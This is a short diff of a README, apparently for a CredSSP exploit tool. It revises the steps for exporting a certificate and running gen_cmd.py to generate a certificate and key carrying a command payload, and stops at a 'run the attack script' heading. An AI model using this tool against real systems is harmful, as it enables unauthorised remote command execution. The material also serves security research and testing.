@@ -29,15 +29,15 @@ $ sudo python setup.py install
 
 
 Export a certificate suitable for Server Authentication from any domain.
+(As shown here https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/dn781533(v=ws.11)) 
 
-
-To generate a suitable certificate for the command to execute : 
+To generate a certificate that exploits the vulnerability(contains the payload),use: 
 
 ```
 $ python credssp/bin/gen_cmd.py -c ExportedCert -o exploitc.pem -k exploitk.pem CMD 
 ```
-
-(exploitc.pem ,exploitk.pem are the generated certificate and private key respectively)
+ (ExportedCert is the  exported certificate from step 1. 
+ exploitc.pem ,exploitk.pem are the generated certificate and private key respectively)
 
 To run the attack script: 
 
